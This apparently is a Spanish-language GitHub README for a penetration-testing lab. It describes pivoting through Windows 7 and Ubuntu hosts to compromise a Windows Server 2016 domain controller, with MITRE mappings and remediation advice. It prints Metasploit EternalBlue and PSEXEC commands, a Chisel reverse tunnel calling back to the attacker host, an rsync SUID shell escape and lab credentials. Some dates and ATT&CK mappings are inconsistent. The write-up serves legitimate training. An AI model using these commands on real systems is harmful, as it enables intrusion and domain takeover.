<div align="center">
  
<h1 style="font-size: 2.5em; margin-bottom: 0.5em;"> Advanced Network Pivoting Laboratory</h1>

![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red?style=for-the-badge)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Mapped-blue?style=for-the-badge)

**Simulación completa de ataque multi-red: Desde perímetro hasta Active Directory**

[Informe Completo](../Practica_3_Pivoting_Oscar_Maidana.pdf) • [LinkedIn](https://linkedin.com/in/oscar-maidana)

</div>

---

## 📋 Resumen Ejecutivo

Este laboratorio demuestra un ataque completo de Red Team en un entorno corporativo segmentado, comprometiendo exitosamente tres máquinas a través de múltiples redes hasta obtener control total del Active Directory. El ejercicio simula un escenario realista donde un atacante con acceso inicial al perímetro debe pivotar a través de redes internas para alcanzar el objetivo crítico.

### 🎖️ Objetivo Alcanzado

Compromiso completo del controlador de dominio (Windows Server 2016) con privilegios **NT AUTHORITY\SYSTEM** mediante pivoting a través de dos redes segmentadas.

---

## 🗺️ Arquitectura del Entorno

```
┌─────────────┐
│  Kali Linux │  Red A: 10.0.2.0/24
│  10.0.2.15  │  (Atacante)
└──────┬──────┘
       │
       │ [Eternal Blue - CVE-2017-0144]
       ↓
┌─────────────────┐
│   Windows 7     │  Red A: 10.0.2.9
│   COMPROMETIDO  │  Red B: 192.168.56.105
└────────┬────────┘  (Pivote 1)
         │
         │ [Chisel SOCKS5 + Port Forwarding]
         ↓
┌─────────────────┐
│     Ubuntu      │  Red B: 192.168.56.103
│   COMPROMETIDO  │  Red C: 192.168.57.100
└────────┬────────┘  (Pivote 2)
         │
         │ [MS17-010 PSEXEC - CVE-2017-0143]
         ↓
┌─────────────────────┐
│  Windows Server 2016│  Red C: 192.168.57.101
│   ACTIVE DIRECTORY  │  (Objetivo Final)
│    ✓ COMPROMETIDO   │
└─────────────────────┘
```

---

## 🔥 Cadena de Ataque Completa

### Fase 1️⃣: Compromiso Inicial - Windows 7

**Vulnerabilidad**: EternalBlue (MS17-010)  
**Resultado**: Shell Meterpreter con privilegios SYSTEM

```bash
# Reconocimiento
nmap -sCV -p- 10.0.2.9

# Explotación
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.9
set LHOST 10.0.2.15
exploit
```

**MITRE ATT&CK**:
- T1046: Network Service Discovery
- T1548.004: Abuse Elevation Control (EternalBlue)
- T1021.002: SMB/Windows Admin Shares

---

### Fase 2️⃣: Pivoting & Descubrimiento - Ubuntu

**Técnica**: Túnel SOCKS5 con Chisel  
**Descubrimiento**: Credenciales débiles en archivo de configuración

```bash
# Servidor Chisel en Kali
./chisel server --reverse --port 1234

# Cliente Chisel en Windows 7 (vía Meterpreter)
execute -f C:\Users\Public\chisel.exe -a "client 10.0.2.15:1234 R:1080"

# Enumeración a través del túnel
proxychains dirsearch -u http://192.168.56.103/
```

**Credenciales halladas**: `ifp:Examenifp123` en `/ifp/config.txt`

```bash
# Acceso SSH
proxychains ssh ifp@192.168.56.103
```

**Escalada de privilegios**:
```bash
# Abuso de SUID - rsync
rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

**MITRE ATT&CK**:
- T1090.001: Proxy (Chisel SOCKS5)
- T1021.004: SSH Remote Services
- T1078.001: Valid Accounts
- T1548: Abuse Elevation Control (SUID)

---

### Fase 3️⃣: Movimiento Lateral - Active Directory

**Target**: Windows Server 2016 (192.168.57.101)  
**Método**: MS17-010 PSEXEC desde Ubuntu

**¿Por qué PSEXEC y no EternalBlue?**

Windows Server 2016 tiene protecciones de kernel (DEP/ASLR/CFG) que bloquean la inyección directa de shellcode. MS17-010 PSEXEC evita esto creando un servicio Windows legítimo en lugar de ejecutar código en memoria kernel.

```bash
# Desde Kali vía proxychains
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.57.101
set payload windows/x64/meterpreter/bind_tcp
set LPORT 4446
exploit
```

**Listener en Ubuntu**:
```bash
nc -lvnp 4446
```

**Resultado**: Acceso NT AUTHORITY\SYSTEM al controlador de dominio

**MITRE ATT&CK**:
- T1021: Remote Services (SMB)
- T1543.003: Create or Modify System Process
- T1106: Native API

---

## 🛠️ Herramientas Utilizadas

| Herramienta | Propósito | Fase |
|------------|-----------|------|
| Nmap | Reconocimiento de red | 1, 2, 3 |
| Netdiscover | Descubrimiento de hosts | 1, 2 |
| Metasploit | Explotación EternalBlue/PSEXEC | 1, 3 |
| Chisel | Túnel SOCKS5 para pivoting | 2 |
| Proxychains | Enrutamiento de tráfico | 2, 3 |
| Dirsearch | Enumeración web | 2 |
| GTFOBins | Escalada de privilegios SUID | 2 |
| Netcat | Shell catching | 3 |

---

## 🎓 Lecciones Aprendidas

### Desafíos Técnicos Superados

**1. Compatibilidad de binarios con sistemas legacy**

Windows 7 (Build 7600, año 2009) no soportaba binarios Chisel modernos. Solución: Utilizar versión legacy de Chisel compilada para sistemas antiguos.

**2. Limitaciones de protecciones de kernel**

EternalBlue falló en Windows Server 2016 debido a:
- Data Execution Prevention (DEP)
- Address Space Layout Randomization (ASLR)
- Control Flow Guard (CFG)

El error `ETERNALBLUE overwrite completed successfully (0xC000000D)!` seguido de `FAIL` indicó que la escritura en memoria funcionó pero la ejecución fue bloqueada.

**Solución**: MS17-010 PSEXEC crea un servicio Windows legítimo vía Service Control Manager, evitando las protecciones de kernel.

**3. Gestión de sesiones Meterpreter múltiples**

Mantener sesiones x86 y x64 simultáneas requirió cuidadosa gestión de payloads y listeners.

**4. Problemas de conectividad de red**

El uso de `bind_tcp` en lugar de `reverse_tcp` fue crucial porque Ubuntu podía conectarse directamente a Windows Server, pero Windows Server no tenía ruta de retorno hacia Kali.

---

## 🔍 Mapeo MITRE ATT&CK

| Táctica | Técnica | ID | Herramienta |
|---------|---------|-----|-------------|
| **Reconnaissance** | Network Service Scanning | T1046 | nmap, netdiscover |
| **Initial Access** | Exploit Public-Facing Application | T1190 | EternalBlue |
| **Execution** | Windows Management Instrumentation | T1047 | Metasploit |
| **Persistence** | Create or Modify System Process | T1543.003 | PSEXEC |
| **Privilege Escalation** | Abuse Elevation Control | T1548 | EternalBlue, SUID |
| **Defense Evasion** | Proxy | T1090.001 | Chisel |
| **Credential Access** | Credentials from Files | T1552.001 | config.txt |
| **Lateral Movement** | Remote Services (SSH) | T1021.004 | OpenSSH |
| **Lateral Movement** | Remote Services (SMB) | T1021.002 | MS17-010 |

---

## 🛡️ Recomendaciones de Remediación

### Críticas (Implementar Inmediatamente)

1. **Parchear vulnerabilidades SMB**
   - CVE-2017-0144 (Windows 7)
   - CVE-2017-0143 (Windows Server 2016)
   - Acción: Aplicar actualizaciones de seguridad o aislar sistemas

2. **Eliminar credenciales en archivos de configuración**
   - Riesgo: Acceso no autorizado a servicios críticos
   - Acción: Implementar gestión segura de secretos (HashiCorp Vault, Azure Key Vault)

3. **Segmentación de red con control de acceso**
   - Implementar VLANs y firewalls internos
   - Principio de mínimo privilegio entre segmentos

### Importantes (Corto Plazo)

4. **Implementar Network Access Control (NAC)**
   - Limitar movimiento lateral
   - Autenticación 802.1X

5. **Auditoría y monitoreo de servicios Windows**
   - Alertas en creación/modificación de servicios
   - SIEM para correlación de eventos

6. **Revisión de binarios SUID en sistemas Linux**
   - Remover permisos SUID innecesarios
   - Monitorear ejecuciones con privilegios elevados

### Recomendadas (Mediano Plazo)

7. **Migración de sistemas legacy**
   - Windows 7 → Windows 10/11
   - Sistemas sin soporte extendido

8. **Implementación de IDS/IPS**
   - Detección de patrones de pivoting
   - Bloqueo automático de tráfico anómalo

9. **Pentesting regular**
   - Validar controles de seguridad
   - Identificar nuevas vulnerabilidades

---

## 📊 Estadísticas del Ejercicio

- **Duración**: 4 días (01/10/2025 - 20/10/2025)
- **Máquinas comprometidas**: 3/3 (100%)
- **Redes pivotadas**: 2 (Red B y Red C)
- **Técnicas MITRE ATT&CK**: 10
- **Vulnerabilidades explotadas**: 3 CVEs
- **Privilegios obtenidos**: NT AUTHORITY\SYSTEM (máximo)

---

## 📄 Documentación

El informe técnico completo incluye:

- ✅ Metodología detallada paso a paso
- ✅ Capturas de pantalla de cada fase
- ✅ Análisis de errores comunes y soluciones
- ✅ Justificación técnica de decisiones
- ✅ Comandos exactos ejecutados
- ✅ Diagrama final de red comprometida
- ✅ Mapeo completo a MITRE ATT&CK Framework
- ✅ Recomendaciones priorizadas de remediación

**[📥 Descargar Informe Completo (PDF)](./Practica_3_-_Pivoting_-_Oscar_Maidana.pdf)**

---

## 🎯 Skills Demostradas

- ✅ **Red Team Operations**: Simulación realista de adversario avanzado
- ✅ **Network Pivoting**: Túneles SOCKS5, port forwarding, proxychains
- ✅ **Windows Exploitation**: EternalBlue, PSEXEC, Meterpreter
- ✅ **Linux Privilege Escalation**: SUID abuse, GTFOBins
- ✅ **Active Directory Attacks**: Compromiso de controlador de dominio
- ✅ **OSINT & Enumeration**: Reconocimiento exhaustivo de servicios
- ✅ **Technical Writing**: Documentación profesional de hallazgos
- ✅ **MITRE ATT&CK**: Mapeo de TTPs de adversarios

---

## 🔗 Contacto

**Oscar Maidana**  
Cybersecurity Analyst | Penetration Tester  

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/oscar-maidana)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github)](https://github.com/OSCAR-MAIDANA)

---

<div align="center">

**⚠️ Disclaimer Legal**

Este ejercicio se realizó en un entorno de laboratorio controlado con fines educativos.  
Todas las técnicas demostradas deben utilizarse únicamente en sistemas autorizados.  
El autor no se hace responsable del uso indebido de esta información.

**🔒 Ethical Hacking | 🎓 Continuous Learning | 🛡️ Defense Through Understanding**

</div>
